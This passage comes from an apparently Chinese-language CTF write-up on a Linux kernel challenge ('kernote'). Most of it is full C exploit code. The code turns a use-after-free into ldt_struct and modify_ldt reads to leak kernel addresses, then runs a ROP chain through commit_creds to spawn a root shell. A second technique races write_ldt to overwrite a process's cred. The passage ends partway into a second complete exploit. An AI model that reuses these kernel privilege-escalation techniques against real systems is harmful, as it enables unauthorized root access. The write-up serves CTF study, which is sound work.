fd;</span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_fd</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">    fd = open(str,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;open wrong&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_reg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;save&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;root wrong&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;get root&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notePut</span><span class="params">(<span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, PUT_NOTE, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteCreate</span><span class="params">(<span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, CREATE_NOTE, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteFree</span><span class="params">(<span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, FREE_NOTE, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteEdit</span><span class="params">(<span class="keyword">size_t</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, EDIT_NOTE, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> magic = <span class="number">0xffffffff817c21a6</span>; <span class="comment">/* add rsp, 0x198; pop r12; pop rbp; ret; */</span></span><br><span class="line"><span class="keyword">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81075c4c</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffffffff810c9dd0</span>;</span><br><span class="line"><span class="keyword">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fb0</span> + <span class="number">10</span>;</span><br><span class="line"><span class="keyword">size_t</span> init_cred = <span class="number">0xffffffff8266b780</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span>     <span class="title">desc</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span>               page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line">    <span class="keyword">size_t</span>               kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="keyword">size_t</span>               search_addr = <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">size_t</span>               kernel_offset = <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">size_t</span>               *buf;</span><br><span class="line">    <span class="keyword">int</span>                  pipe_fd[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span>                  retval;</span><br><span class="line"></span><br><span class="line">    save_reg();</span><br><span class="line">    init_fd(<span class="string">&quot;/dev/kernote&quot;</span>);</span><br><span class="line"></span><br><span class="line">    desc.base_addr = <span class="number">0xff0000</span>;</span><br><span class="line">    desc.entry_number = <span class="number">0x8000</span> / <span class="number">8</span>;</span><br><span class="line">    desc.limit = <span class="number">0</span>;</span><br><span class="line">    desc.seg_32bit = <span class="number">0</span>;</span><br><span class="line">    desc.contents = <span class="number">0</span>;</span><br><span class="line">    desc.limit_in_pages = <span class="number">0</span>;</span><br><span class="line">    desc.lm = <span class="number">0</span>;</span><br><span class="line">    desc.read_exec_only = <span class="number">0</span>;</span><br><span class="line">    desc.seg_not_present = <span class="number">0</span>;</span><br><span class="line">    desc.useable = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    noteCreate(<span class="number">0</span>);</span><br><span class="line">    notePut(<span class="number">0</span>);</span><br><span class="line">    noteFree(<span class="number">0</span>);</span><br><span class="line">    syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        noteEdit(page_offset_base);</span><br><span class="line">        retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;desc, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        page_offset_base += <span class="number">0x4000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;page_offset_base: 0x%lx\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    buf = (<span class="keyword">size_t</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x8000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    search_addr = page_offset_base;</span><br><span class="line">    kernel_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        noteEdit(search_addr);</span><br><span class="line">        retval = fork();</span><br><span class="line">        <span class="keyword">if</span> (!retval)    </span><br><span class="line">        &#123;</span><br><span class="line">            syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (buf[i] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; (buf[i] &amp; <span class="number">0xfff</span>) == <span class="number">0x040</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    kernel_base = buf[i] -  <span class="number">0x040</span>;</span><br><span class="line">                    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;found kernel base: 0x%lx\n&quot;</span>, kernel_base);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;kernel offset: 0x%lx\n&quot;</span>, kernel_offset);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            write(pipe_fd[<span class="number">1</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        read(pipe_fd[<span class="number">0</span>], &amp;kernel_base, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (kernel_base)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        search_addr += <span class="number">0x8000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line">    magic += kernel_offset;</span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset;</span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line"></span><br><span class="line">    noteCreate(<span class="number">1</span>);</span><br><span class="line">    notePut(<span class="number">1</span>);</span><br><span class="line">    noteFree(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    noteEdit(magic);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic gadget: 0x%lx\n&quot;</span>, magic);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0x44444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   pop_rdi_ret;&quot;</span> </span><br><span class="line">        <span class="string">&quot;mov r12,   init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0x00000000;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    0x88888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    get_root();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>ldt_struct + modify_ldt + 条件竞争</strong></p>
<p>利用条件竞争可以在 <code>write_ldt</code> 中实现任意写：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">write_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount, <span class="keyword">int</span> oldmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">    new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">    error = -ENOMEM;</span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">        <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>基础的逻辑为：<ul>
<li>新申请一个 <code>ldt_struct</code></li>
<li>执行 <code>memcpy</code> 把旧的 <code>ldt_struct</code> 数据拷贝到新的 <code>ldt_struct</code> 中</li>
</ul>
</li>
<li>注意最后一句 <code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt</code><ul>
<li><code>ldt</code> 是我们写入的数据</li>
</ul>
</li>
<li>通过条件竞争的方式在 <code>memcpy</code> 过程中将 <code>new_ldt-&gt;entries</code> 更改为我们的目标地址从而完成任意地址写，即 Double Fetch </li>
</ul>
<p>使用条件竞争通常都是修改 <code>task_struct</code> 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">ptracer_cred</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">real_cred</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>            *<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">char</span>                comm[TASK_COMM_LEN];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span>        *<span class="title">nameidata</span>;</span></span><br><span class="line">   </span><br><span class="line">    ......</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>我们可以用和爆破内核基地址类似的方式来爆破 <code>task_struct</code>：</p>
<ul>
<li>字段 <code>comm[TASK_COMM_LEN]</code> 存放着该进程的名字 </li>
<li>使用 <code>prctl(PR_SET_NAME, &quot;name&quot;)</code> 可以修改 <code>comm[TASK_COMM_LEN]</code> 字段</li>
<li>使用 <code>memmem</code> 可以在一块内存中寻找匹配另一块内存的内容的第一个位置 </li>
</ul>
<p>参考爆破脚本如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    noteEdit(page_offset_base);</span><br><span class="line">    retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;desc, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    page_offset_base += <span class="number">0x4000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;page_offset_base: 0x%lx\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">cur_pid = getpid();</span><br><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;aaaaaaaa&quot;</span>);</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line">buf = (<span class="keyword">size_t</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x8000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">search_addr = page_offset_base;</span><br><span class="line">cred_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    noteEdit(search_addr);</span><br><span class="line">    retval = fork();</span><br><span class="line">    <span class="keyword">if</span> (!retval)    </span><br><span class="line">    &#123;</span><br><span class="line">        syscall(SYS_modify_ldt, <span class="number">0</span>, buf, <span class="number">0x8000</span>);</span><br><span class="line">        result_addr = (<span class="keyword">size_t</span>*) memmem(buf, <span class="number">0x8000</span>, <span class="string">&quot;aaaaaaaa&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (result_addr \</span><br><span class="line">            &amp;&amp; (result_addr[<span class="number">-2</span>] &gt; page_offset_base) \</span><br><span class="line">            &amp;&amp; (result_addr[<span class="number">-3</span>] &gt; page_offset_base) \</span><br><span class="line">            &amp;&amp; (((<span class="keyword">int</span>) result_addr[<span class="number">-58</span>]) == cur_pid))</span><br><span class="line">        &#123;</span><br><span class="line">            cred_addr = result_addr[<span class="number">-2</span>];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;found cred_addr: 0x%lx\n&quot;</span>, cred_addr);</span><br><span class="line">        &#125;</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">    read(pipe_fd[<span class="number">0</span>], &amp;cred_addr, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (cred_addr)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    search_addr += <span class="number">0x8000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在我们获得了 <code>cred</code> 的地址之后，我们只需要将 <code>cred-&gt;euid</code> 更改为 0 就能拥有 root 权限，之后再调用 <code>setreuid</code> 等一系列函数完成全面的提权，详细步骤如下：</p>
<ul>
<li>开启一个子进程（为了不触发 <code>hardened usercopy</code>）</li>
<li>在子进程中再开启一个子进程，申请多个 note 并释放（为了后续的 <code>ldt_struct</code> 可以命中 UAF 堆块）</li>
<li>并不断往全局变量 note 写入 <code>cred_addr+4</code>（为了修改 <code>new_ldt-&gt;entries</code> 为 <code>cred_addr+4</code>）</li>
<li>在父进程中调用 <code>write_ldt</code></li>
</ul>
<p>在满足如下两个条件时，就可以成功提权：</p>
<ul>
<li>在 <code>alloc_ldt_struct</code> 执行之后，生成的 <code>ldt_struct</code> 成功命中 UAF 堆块</li>
<li>在 <code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt</code> 执行之前，成功写入 <code>cred_addr+4</code></li>
</ul>
<p>最后条件竞争的过程有点抽象，我尝试了 30~40 遍才成功一次</p>
<ul>
<li>为了提高利用的成功率，可以使用 <code>sched_setaffinity</code> 将相应的进程绑定到单个 CPU 上（在 run.sh 中定义了两个核）</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FREE_NOTE 0x6668</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT_NOTE 0x6666</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CREATE_NOTE 0x6667</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EDIT_NOTE 0x6669</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">init_fd</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">    fd = open(str,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;open wrong&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_reg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span 